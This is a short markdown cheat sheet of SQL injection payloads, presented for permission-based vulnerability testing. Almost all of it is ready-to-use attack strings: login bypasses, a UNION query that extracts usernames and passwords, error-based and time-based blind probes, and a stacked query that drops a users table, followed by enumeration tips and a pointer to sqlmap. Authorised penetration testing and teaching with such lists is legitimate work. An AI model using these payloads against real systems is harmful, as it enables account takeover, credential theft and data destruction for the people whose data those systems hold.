# Basic SQL Injection Payloads Cheat Sheet

A list of common SQL Injection payloads to test for vulnerabilities.  
**Use responsibly and only on systems you have permission to test.**

---

## 1. Basic Authentication Bypass

```
' OR '1'='1' --
" OR "1"="1" --
' OR 1=1--
" OR 1=1--
') OR ('1'='1' --
```

---

## 2. UNION-Based Injection

```
' UNION SELECT NULL, NULL --
' UNION SELECT username, password FROM users --
```

---

## 3. Error-Based Injection

```
' AND 1=CONVERT(int, (SELECT @@version))--
```

---

## 4. Time-Based Blind Injection

```
' OR IF(1=1, SLEEP(5), 0)--
' OR 1=1 WAITFOR DELAY '0:0:5'--
```

---

## 5. Stacked Queries (if supported)

```
'; DROP TABLE users; --
```

---

## 6. Comment/Termination

```
' --
" --
') --
```

---

## 7. Numeric Injection

```
1 OR 1=1
1' OR '1'='1
```

---

## Tips

- Try payloads in different parameters (URL, POST data, cookies, headers).
- Use `ORDER BY` to find the number of columns:  
  `' ORDER BY 1--`, `' ORDER BY 2--`, etc.
- Use `LIMIT` for MySQL:  
  `' LIMIT 1,1 --`
- Use tools like `sqlmap` for automated testing.

---

## References

- [PayloadAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [OWASP SQL Injection Cheat Sheet](https://owasp.org/www-community/attacks/SQL_Injection)